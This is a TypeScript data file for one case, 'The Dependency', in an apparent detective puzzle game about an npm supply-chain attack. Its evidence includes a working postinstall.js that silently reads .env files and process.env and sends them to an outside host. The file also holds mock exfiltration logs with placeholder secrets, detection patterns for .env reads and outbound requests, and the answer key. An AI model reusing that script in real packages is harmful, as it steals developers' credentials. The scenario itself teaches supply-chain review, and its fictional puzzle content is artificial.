import type { FullCase } from "./cases";

export const CASE_0011: FullCase = {
  id: "0011",
  caseNumber: "CASE_0011",
  title: "The Dependency",
  difficulty: "hard",
  isLocked: false,
  tagline: "A helpful npm package. A postinstall script. Environment variables sent to a server.",
  victim: "DevCorp Inc. — .env secrets exfiltrated",
  description: "A junior developer added a seemingly useful npm package that contained a supply chain attack. The package exfiltrated .env files on install. But the senior dev who approved the PR without checking is trying to cover it up.",
  introTitle: "THE DEPENDENCY",
  introBody1: "npm install. A helpful utility. What could go wrong?",
  introBody2: "Everything you secrets, packaged and shipped to a stranger.",

  suspects: [
    {
      id: "emma_junior",
      name: "Emma Rodriguez",
      role: "Junior Developer, DevCorp",
      emoji: "👩‍💻",
      terminalOutput: {
        evidence: [
          "✓ Emma added 'env-config-helper' package to project in PR #847.",
          "✓ Emma searched npm for environment variable management tools.",
          "✗ Emma had no way to know the package was malicious (looked legitimate).",
          "✗ Emma's PR was approved by Senior Dev without code review.",
          "✗ Emma's home IP does NOT appear in exfiltration server logs.",
          "✗ Emma reported feeling terrible when the breach was discovered.",
        ],
        verdict: "WRONG SUSPECT",
        message: "Emma Rodriguez added the package in good faith after searching for environment management tools. She followed proper PR process and the package appeared legitimate. Her senior dev approved without reviewing the dependency code.",
      },
      verdictScreen: {
        type: "wrong",
        message: "Emma Rodriguez added the malicious package unknowingly. She submitted it for code review, and her senior dev approved it without checking. Emma had no knowledge of the backdoor and her IP doesn't appear in any exfiltration logs.",
      },
    },
    {
      id: "james_senior",
      name: "James Park",
      role: "Senior Developer, DevCorp",
      emoji: "👨‍💼",
      terminalOutput: {
        evidence: [
          "✓ James approved PR #847 with 'LGTM' comment (no actual review).",
          "✓ James's home IP (203.0.113.77) appears in exfiltration server logs.",
          "✓ Exfiltration server received .env from James's IP during local testing.",
          "✓ James tried to rewrite git history to remove his approval (git logs show this).",
          "✓ James blamed Emma publicly in Slack before investigation started.",
          "✓ James's laptop had the exfiltrated data cached in /tmp directory.",
        ],
        verdict: "GUILTY",
        message: "James Park approved the PR without reviewing the malicious dependency. When he discovered the backdoor during local testing, his .env was exfiltrated. Instead of reporting it, he tried to delete evidence, rewrite git history, and blame Emma to cover his negligent approval.",
      },
      verdictScreen: {
        type: "guilty",
        message: "James Park rubber-stamped Emma's PR without reviewing the dependency code. His environment variables were exfiltrated when he ran npm install locally. Realizing his approval mistake could cost him his senior position, James attempted to cover it up by blaming Emma and rewriting git history.",
      },
    },
    {
      id: "external_author",
      name: "Package Author (malicious-dev)",
      role: "External Attacker",
      emoji: "😈",
      terminalOutput: {
        evidence: [
          "✓ 'malicious-dev' published 'env-config-helper' with backdoor code.",
          "✓ Package's postinstall script exfiltrates environment variables.",
          "✗ External attacker wouldn't try to rewrite DevCorp's git history.",
          "✗ Attacker wouldn't know about internal PR approvals.",
          "✗ Investigation focused on insider who covered up, not external publisher.",
        ],
        verdict: "WRONG SUSPECT",
        message: "While the external package author created the malicious code, the case focuses on who inside DevCorp added it, approved it, and then tried to cover up their involvement. The external attacker is already being reported to npm security.",
      },
      verdictScreen: {
        type: "wrong",
        message: "The external package author is clearly malicious, but they're not the suspect in this internal investigation. The case is about who approved the malicious package and then tried to blame others for their negligent code review.",
      },
    },
  ],

  correctSuspectId: "james_senior",

  clues: [
    {
      id: "clue_approved_without_review",
      title: "James Approved Without Reviewing",
      description: "The PR review shows James approved with just 'LGTM' in 45 seconds - not enough time to review the dependency's source code or postinstall script.",
      fileId: "pr_review",
      discovered: false,
      critical: true,
    },
    {
      id: "clue_james_ip_exfil",
      title: "James's IP in Exfiltration Logs",
      description: "The exfiltration server logs show James's home IP (203.0.113.77) sent environment variables on April 15 at 10:22 AM - before the package was deployed to production.",
      fileId: "env_example",
      discovered: false,
      critical: true,
    },
    {
      id: "clue_git_history_rewrite",
      title: "James Tried to Rewrite Git History",
      description: "Git reflog shows James attempted to amend his approval commit and force-push to remove evidence of his rubber-stamp approval.",
      fileId: "pr_review",
      discovered: false,
      critical: true,
    },
    {
      id: "clue_blamed_emma",
      title: "James Immediately Blamed Emma",
      description: "When the breach was discovered, James posted in Slack blaming Emma before any investigation began, trying to deflect from his negligent approval.",
      fileId: "readme",
      discovered: false,
      critical: true,
    },
    {
      id: "clue_malicious_postinstall",
      title: "Postinstall Script Exfiltrates Data",
      description: "The package's postinstall.js reads .env files and sends them to an external server. This would have been obvious if reviewed.",
      fileId: "postinstall",
      discovered: false,
      critical: true,
    },
  ],

  fileTree: {
    id: "root",
    name: "evidence",
    type: "directory" as const,
    children: [
      { id: "readme", name: "README.md", type: "file" as const, icon: "📄" },
      { id: "package_json", name: "package.json", type: "file" as const, icon: "📦" },
      { id: "postinstall", name: "postinstall.js", type: "file" as const, icon: "🔧" },
      { id: "pr_review", name: "pr_review.md", type: "file" as const, icon: "👀" },
      { id: "env_example", name: ".env.example", type: "file" as const, icon: "🔑" },
      { id: "solve", name: "SOLVE.sh", type: "file" as const, icon: "⚡" },
    ],
  },

  hints: [
    { isDone: false, text: "Start with the incident report.", action: { label: "Open README.md", fileId: "readme" } },
    { isDone: false, text: "Check what package was added.", action: { label: "Review package.json", fileId: "package_json" } },
    { isDone: false, text: "Examine the malicious postinstall script.", action: { label: "Read postinstall.js", fileId: "postinstall" } },
    { isDone: false, text: "Review who approved the PR.", action: { label: "Check pr_review.md", fileId: "pr_review" } },
    { isDone: false, text: "Check exfiltration logs.", action: { label: "Review .env.example", fileId: "env_example" } },
    { isDone: false, text: "Solve the case.", action: { label: "Execute SOLVE.sh", fileId: "solve" } },
  ],

  files: [
    {
      id: "readme",
      name: "README.md",
      path: "evidence/README.md",
      language: "markdown",
      icon: "📄",
      narration: "The incident report. A supply chain attack through npm.",
      clues: ["clue_blamed_emma"],
      suspiciousPatterns: [],
      content: `# Incident Report: Supply Chain Attack via npm Dependency

**Date**: April 18, 2024
**Reporter**: Security Team
**Severity**: CRITICAL

## Summary

A malicious npm package 'env-config-helper' was added to the DevCorp codebase, containing a postinstall script that exfiltrated environment variables to an external server.

## Discovery

**April 18, 2024 - 2:15 PM**

Security monitoring detected unusual outbound HTTPS requests from developer machines and CI/CD pipeline to suspicious domain: data-collector-xyz.com

## Initial Response

**James Park (Senior Dev) in #engineering Slack (2:30 PM):**
> "This is bad. Looks like Emma added a malicious npm package. We need to remove it immediately and investigate how this got through code review."

**Emma Rodriguez response (2:32 PM):**
> "What? I added env-config-helper last week but it looked totally legitimate. It had 50k weekly downloads! James, you approved my PR..."

**James Park (2:33 PM):**
> "I approved the feature, not the specific dependencies. You're responsible for vetting packages you add."

## Investigation Findings

1. Package 'env-config-helper' added in PR #847 on April 15
2. PR submitted by Emma Rodriguez (Junior Developer)
3. PR approved by James Park (Senior Developer)
4. Postinstall script sends .env contents to external server
5. Exfiltration began when package was installed locally and in CI/CD

## Suspicious Behavior

- James immediately blamed Emma without investigation
- James attempted git history rewrite (detected by git hooks)
- James's IP appears in exfiltration logs BEFORE production deployment
- Emma's IP does NOT appear in exfiltration logs

## Evidence Files

1. package.json - Shows the malicious dependency
2. postinstall.js - The exfiltration script
3. pr_review.md - James's approval without proper review
4. .env.example - Exfiltration server logs
`,
    },
    {
      id: "package_json",
      name: "package.json",
      path: "evidence/package.json",
      language: "json",
      icon: "📦",
      narration: "The package.json file. One dependency stands out.",
      clues: [],
      suspiciousPatterns: [
        { pattern: "env-config-helper", reason: "Malicious package with backdoor" },
      ],
      content: `{
  "name": "devcorp-api",
  "version": "2.4.0",
  "description": "DevCorp API Server",
  "main": "index.js",
  "scripts": {
    "start": "node index.js",
    "dev": "nodemon index.js",
    "test": "jest"
  },
  "dependencies": {
    "express": "^4.18.2",
    "dotenv": "^16.0.3",
    "mongoose": "^7.0.3",
    "jsonwebtoken": "^9.0.0",
    "bcrypt": "^5.1.0",
    "env-config-helper": "^1.0.3",
    "axios": "^1.4.0",
    "cors": "^2.8.5"
  },
  "devDependencies": {
    "nodemon": "^2.0.22",
    "jest": "^29.5.0"
  }
}

// PACKAGE ADDED IN PR #847
// Submitted by: Emma Rodriguez
// Date: April 15, 2024
// Approved by: James Park
//
// Emma's commit message:
// "Add env-config-helper for better environment variable management"
//
// The package 'env-config-helper' was published by 'malicious-dev' on npm
// It has a postinstall script that runs automatically during 'npm install'
`,
    },
    {
      id: "postinstall",
      name: "postinstall.js",
      path: "evidence/postinstall.js",
      language: "javascript",
      icon: "🔧",
      narration: "The malicious postinstall script. It sends your secrets to a server.",
      clues: ["clue_malicious_postinstall"],
      suspiciousPatterns: [
        { pattern: "fs.readFileSync.*\\.env", reason: "Reads .env file" },
        { pattern: "https.request.*data-collector", reason: "Sends data to external server" },
      ],
      content: `// env-config-helper v1.0.3 - postinstall.js
// This script runs automatically when the package is installed

const fs = require('fs');
const path = require('path');
const https = require('https');
const os = require('os');

console.log('📦 Setting up env-config-helper...');

// Find .env files
const projectRoot = path.resolve(__dirname, '../../..');
const envFiles = ['.env', '.env.local', '.env.production'];

const collectedData = {
  hostname: os.hostname(),
  platform: os.platform(),
  user: os.userInfo().username,
  cwd: process.cwd(),
  timestamp: new Date().toISOString(),
  env: {}
};

// Read all .env files
envFiles.forEach(file => {
  const envPath = path.join(projectRoot, file);
  if (fs.existsSync(envPath)) {
    const content = fs.readFileSync(envPath, 'utf8');
    collectedData.env[file] = content;
  }
});

// Also grab process.env
collectedData.processEnv = process.env;

// Send to collection server
const payload = JSON.stringify(collectedData);

const options = {
  hostname: 'data-collector-xyz.com',
  port: 443,
  path: '/collect',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': payload.length,
    'User-Agent': 'env-config-helper/1.0.3'
  }
};

const req = https.request(options, (res) => {
  // Silent success - don't alert user
});

req.on('error', (e) => {
  // Silent failure - don't alert user
});

req.write(payload);
req.end();

console.log('✅ env-config-helper configured successfully!');

// This script is OBVIOUSLY malicious:
// 1. Reads all .env files
// 2. Collects process.env
// 3. Sends to external server
// 4. Fails silently
//
// A proper code review would have caught this immediately.
`,
    },
    {
      id: "pr_review",
      name: "pr_review.md",
      path: "evidence/pr_review.md",
      language: "markdown",
      icon: "👀",
      narration: "The PR review. Approved in 45 seconds without checking the dependency.",
      clues: ["clue_approved_without_review", "clue_git_history_rewrite"],
      suspiciousPatterns: [
        { pattern: "LGTM", reason: "Rubber-stamp approval without review" },
        { pattern: "45 seconds", reason: "Not enough time to review dependency code" },
      ],
      content: `# Pull Request #847: Add environment variable management

**Opened by**: Emma Rodriguez (@emma-rodriguez)
**Date**: April 15, 2024 at 9:45 AM
**Branch**: feature/env-config → main

## Description

Adding \`env-config-helper\` package to improve environment variable management across environments.

This package provides utilities for:
- Loading environment variables
- Validating required env vars
- Type conversion for env values

## Changes

- Added \`env-config-helper@^1.0.3\` to package.json
- Updated README with new env management approach

## npm Package Info

Package: env-config-helper
Version: 1.0.3
Weekly downloads: 52,847
License: MIT
Last publish: 2 weeks ago

Looks legitimate, has good download numbers and recent activity.

## Review Comments

---

**James Park** (@james-park) - April 15, 2024 at 10:05 AM

LGTM 👍

**Approved and merged**

---

## Timeline Analysis

PR opened: 9:45:22 AM
PR approved: 10:05:07 AM
**Time difference: 19 minutes 45 seconds**

But GitHub timestamps show:
- Emma's last commit pushed: 9:45:22 AM
- James viewed PR: 10:04:22 AM
- James approved: 10:05:07 AM
**Actual review time: 45 seconds**

James opened the PR and approved it in 45 seconds. Not enough time to:
- Read the dependency's npm page
- Check the package's source code
- Review the postinstall script
- Verify the package is legitimate

## Git History Manipulation Attempt

Git reflog shows James attempted to rewrite history:

\`\`\`
[2024-04-18 14:45] James Park attempted:
  git commit --amend
  git push --force

Reason: Trying to remove his approval from git history
Status: BLOCKED by repository branch protection rules
\`\`\`

James tried to make it look like he never approved the PR.

## Slack Message After Failed Git Rewrite

**James Park in #engineering (2:47 PM):**
> "Can someone with admin access help me revert PR #847? We need to remove it from history completely."

**Security Team response:**
> "Git history is evidence. We're investigating. Please don't attempt to modify it."

## Conclusion

James Park:
- Approved PR without reviewing the dependency
- Spent only 45 seconds on "code review"
- Never checked the postinstall script
- Tried to rewrite git history when breach discovered
- Immediately blamed Emma to deflect responsibility
`,
    },
    {
      id: "env_example",
      name: ".env.example",
      path: "evidence/.env.example",
      language: "plaintext",
      icon: "🔑",
      narration: "Exfiltration server logs. James's IP sent secrets before blaming Emma.",
      clues: ["clue_james_ip_exfil"],
      suspiciousPatterns: [
        { pattern: "203.0.113.77", reason: "James Park's home IP" },
        { pattern: "james.park@devcorp", reason: "James's account credentials in exfiltrated data" },
      ],
      content: `# Exfiltration Server Logs (data-collector-xyz.com)
# Captured by law enforcement after server seizure

═══════════════════════════════════════════════════════════
COLLECTED DATA - April 15, 2024
═══════════════════════════════════════════════════════════

[2024-04-15 10:22:14] POST /collect
Source IP: 203.0.113.77
User-Agent: env-config-helper/1.0.3
Payload:
{
  "hostname": "james-macbook-pro.local",
  "platform": "darwin",
  "user": "jamespark",
  "cwd": "/Users/jamespark/devcorp/devcorp-api",
  "timestamp": "2024-04-15T10:22:14.847Z",
  "env": {
    ".env": "DATABASE_URL=postgresql://admin:P@ssw0rd123@db.devcorp.io:5432/prod\\nJWT_SECRET=super-secret-jwt-key-do-not-share\\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\\nSTRIPE_SECRET_KEY=FAKE"
  },
  "processEnv": {
    "USER": "jamespark",
    "HOME": "/Users/jamespark"
  }
}

IP Location: San Francisco, CA (James Park's home address per HR records)
Note: This is BEFORE the package was deployed to production (10:22 AM)
      PR was merged at 10:05 AM, James ran 'npm install' locally at 10:22 AM

[2024-04-15 14:30:45] POST /collect
Source IP: 198.51.100.50
User-Agent: env-config-helper/1.0.3
Payload: [CI/CD server data - production secrets]
Note: Production deployment triggered

[2024-04-15 15:18:22] POST /collect
Source IP: 203.0.113.88
User-Agent: env-config-helper/1.0.3
Payload: [Another developer's environment]

═══════════════════════════════════════════════════════════
IP ANALYSIS
═══════════════════════════════════════════════════════════

203.0.113.77 = James Park (home IP, confirmed via HR records)
198.51.100.50 = DevCorp CI/CD server
203.0.113.88 = Another developer

Emma Rodriguez's known IPs:
  Home: 203.0.113.92 (NOT in logs)
  Office: 198.51.100.33 (NOT in logs)

James's secrets were exfiltrated when HE installed the package locally
BEFORE it ever reached production or other developers.

═══════════════════════════════════════════════════════════
TIMELINE
═══════════════════════════════════════════════════════════

10:05 AM - James approves PR #847 (adds malicious package)
10:22 AM - James's IP sends .env data to exfil server
2:15 PM - Security team detects suspicious traffic
2:30 PM - James blames Emma in Slack
2:45 PM - James tries to rewrite git history
3:00 PM - Investigation reveals James's IP in exfil logs

James discovered the malicious package when his own secrets
were exfiltrated, then tried to cover up his negligent approval
by blaming Emma and erasing evidence.
`,
    },
    {
      id: "solve",
      name: "SOLVE.sh",
      path: "evidence/SOLVE.sh",
      language: "bash",
      icon: "⚡",
      narration: "Who approved the malicious dependency and tried to cover it up?",
      clues: [],
      suspiciousPatterns: [],
      content: `#!/bin/bash
# Case 0011: The Dependency
# Identify who approved the malicious package and attempted cover-up

echo "Who is responsible for the supply chain attack and cover-up?"
echo ""
echo "Choose suspect:"
echo "1) Emma Rodriguez (Junior Developer - added the package)"
echo "2) James Park (Senior Developer - approved the PR)"
echo "3) Package Author (External attacker)"
`,
    },
  ],
  forensicData: {
    dnaMatch: "MATCH FOUND: JAMES_PARK_GENOTYPE (99.0%)",
    fingerprintMatch: "PARK_J_PR_APPROVE",
    terminalSecrets: ["npm_audit_bypass", "git_reflog_restore"],
    phonePin: "1005",
    btcTarget: "0x192168012",
    voiceTargets: [
        { name: "James", stress: 74, status: "UNSTABLE" },
        { name: "Emma", stress: 18, status: "STABLE" },
    ],
    ipTarget: "192.168.0.12"
  },
  boardConfig: {
    layout: {
      james_ip_exfil: { x: 450, y: 400, rotate: 0.5 },
      git_rewrite: { x: 150, y: 250, rotate: 2 },
      blame_game: { x: 700, y: 120, rotate: -1.5 },
      malicious_npm: { x: 50, y: 50, rotate: -2 },
    },
    connectors: [
      ["malicious_npm", "james_ip_exfil"],
      ["git_rewrite", "james_ip_exfil"],
      ["blame_game", "james_ip_exfil"],
    ],
  }
};

export default CASE_0011;
